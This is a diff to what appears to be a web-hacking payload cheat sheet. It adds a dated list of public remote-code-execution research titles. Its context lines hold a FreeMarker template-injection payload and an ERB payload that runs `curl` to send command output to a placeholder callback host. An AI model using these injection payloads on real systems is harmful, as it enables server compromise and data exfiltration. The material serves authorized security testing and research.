@@ -777,3 +777,13 @@ ${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilde
 <%= system("curl http://COLLAB/$(id)") %>
 ```
 
+## webhacklist 2024-2026 updates
+
+- **Python Dirty Arbitrary File Write to RCE** — 2025. With AFW, write a shared-object `.so` (then load it) or overwrite bytecode `.pyc`/config. See also `Write Once, Shell Everywhere` (2026).
+- **From Arbitrary File Write to RCE in Restricted Rails apps** — 2024. Rails file-write to callable gadget.
+- **Remote Code Execution in Google Cloud with single directory deletion** — 2026. A deletion primitive to RCE in a cloud service.
+- **wp2shell: Pre-Auth RCE in WordPress Core** — 2026. See `hunt-wordpress`.
+- **React2Shell: JS deserialization RCE** — 2025 (CVE-2025-55182). React Server Components deserialization to RCE.
+- **Temenos OFS field injection to financial RCE** — 2025. Field-based injection into a financial transaction engine.
+- **Bypassing .NET Serialization Binders / Hardened .NET deser** — 2022/2023 #2. Modern .NET deser bypasses — see `hunt-deserialization`.
+
